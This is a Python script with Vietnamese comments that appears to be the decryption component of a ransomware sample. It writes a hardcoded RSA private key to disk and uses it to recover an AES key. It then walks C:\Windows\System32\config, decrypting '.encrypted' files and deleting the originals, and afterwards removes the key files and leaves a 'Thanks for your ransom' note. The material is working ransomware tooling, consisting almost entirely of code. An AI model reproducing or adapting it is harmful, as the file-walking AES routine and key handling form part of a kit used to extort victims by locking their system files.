from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES
import os
import subprocess

# Hàm giải mã file bằng RSA
def rsa_decrypt_file(input_file, output_file, private_key_file):
    # Đọc nội dung của file input vào bộ nhớ
    with open(input_file, "rb") as file:
        ciphertext = file.read()

    # Load khóa bí mật từ file .pem
    with open(private_key_file, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            password=None,
            backend=default_backend()
        )

    # Giải mã nội dung của file
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    # Ghi kết quả giải mã vào file output
    with open(output_file, "wb") as file:
        file.write(plaintext)

# Hàm giải mã file bằng AES
def decrypt_file(key, filename):
    chunksize = 64 * 1024
    output_filename = os.path.splitext(filename)[0]

    with open(filename, 'rb') as infile:
        filesize = int(infile.read(16))
        iv = infile.read(16)

        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(output_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(filesize)

    return output_filename

# Hàm giải mã thư mục và các tệp tin con bằng AES
def decrypt_directory(key, directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path) and file.endswith('.encrypted'):
                try:
                    decrypted_file = decrypt_file(key, file_path)
                    os.remove(file_path)
                except:
                    pass

# ...

text = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCq+730fnkdPmDk\n2SztD91VpJc/aMYdiQieH//tI4WbFfdvMHlPfhQtAFSdZ0C+mgd/yuzfFJxMDxLn\nmSZIYpoT4Fev86UNew5znHsSO7pNMPafes7gL43N8hrX5xsUfQF9EaSqaPPDeHmE\n7242vBv9Kh8boWXRKoq4WlXlIjNEIw6b7DMlE5rr63K1f02nvcA8jdKPWjQ7x7A6\nloCwUS9QbiwV8sGFf2UjaVmU7+2XHVxZLM6J3q2ADl07deJRdEgFvD4QSDsYE3PP\nzTuwAKUDZEz4y+BHRHAUw2xu+qVoktSZ5OcFqDBmpNwNNua8/IzrBNwyAz4o+ipb\nsE2d33vrAgMBAAECggEAIR2Sw8i/Alfzgj9BwURCVPUEyiYrwMqqnZ2K/s3TcZ8G\nhkV4KVo85B5dRQMbeg7xBuIxkF84ik6dFbgGvxxBxTm9IfnpbLv5p5CWEYj54ztp\neKfba3YqW8nZQxmimAxB/owtPUgIdkJeHs4UpYs3TIgc8EgJJUK9DUmJu1AtZ7Ok\ns5jTzxg5y4Klm2SZpcS7+aCsUb+UOm6eE9DQ2yzLsdkuPxKyJ2p65Aj+qxB+9Vgq\nQlS7POi65py7Qe1w3NnOxHEk3DULwXE6PJ8/qsK/2ohmqITmt8BcBuOQIe5HDkfs\nFlyTetfe1rQr+QOP23RVnoBi4Km0iZby5WxPjXmLuQKBgQDvyuFQKvisQdv+Y7Mr\naW4w0DVrC1dUgBmqf7zWYDXn1u8YHREs8+M+aTB17TdRNPmJ4lGDudeTY1e1IgK0\nOrveDCHPRu06PPGYUk7RQbyd24dRVQZ21Xoz+QXTexK3zgR2U6gSdI08tad3ZnH+\nV5GQwtQVd5ZoVnwgf/5PKPtVfwKBgQC2ikKf24I88aZkzx7x+PakXwA1SZCPDvqs\nRf7c4DKyk7fUnhVUET6FwGA+g3RmdKwhJvLl78DrSz/3khBwVjKVNiGJPZvybPOY\n2y/0Phg/7LQeFtyugj75oK4biNKXDIyqqtNAPQ5AitSjkt9FUAPhsvh1OdatDjjP\nYcWeVl/HlQKBgCrrMxy4ND4Qo6GKkr0IZ9KQ0Z7RLtZO/0kHB/OO0NcoHy8/tJ1J\nIbk/9o6E4MvGIYvOWCytjKoys7YV2koL4ShDH6IL3dX4pn1O7hCCJZJTgorKHxgR\n6Yd34NUTSCxh0WakXoa/GbBuCwVR7sFJRyKT3IXjG6adJCZlAk2E1kddAoGBAICF\nolkpVW6ReeVai2A1OXsLxHrAW/7NviMTeVmMpUVkijcyQrQZHBtSErGRHqCQny0M\nXlMU1pEUP2qRNe/SUPUL0trtPOKYYX8LPJ1MJwjDISJaWHCqFaruvgd280cUt+nm\nMqz1EBbTaNnurDMCHmmH+DWZTpQ0Aj3JijlseS1tAoGAQw/vTNe9QJe7iphm5Hnk\nwVAIhwy9kpAXtDckn31fcP1MBeoNlNrVKnqHk5JUe6rfwRP6+lv2XZ4TG6Mv63E2\n5PPhgMbkdhjpySl++xj6AjcaalIXDdc+ik7Fdvf7M6AJn7BjsvP495DCh2iF9zJ2\nKMGQE4ArwI8YuklUP1Mrc+U=\n-----END PRIVATE KEY-----"

# Mở tệp văn bản để ghi
with open("private_key.pem", "w") as file:
    file.write(text)

input_file = './Key_AES.txt.encrypt'
output_file = './Key_AES.txt'
private_key_file = './private_key.pem'

rsa_decrypt_file(input_file, output_file, private_key_file)
os.remove(input_file)

with open('./Key_AES.txt', 'rb') as infile:
    Key = infile.read()

dir_path = 'C:\Windows\System32\config'
decrypt_directory(Key, dir_path)

os.remove("private_key.pem")
os.remove("Key_AES.txt")
os.remove("public_key.pem")

text = "Thanks for your ransom"
# Mở tệp văn bản để ghi
with open("Readme.md", "w") as file:
    file.write(text)
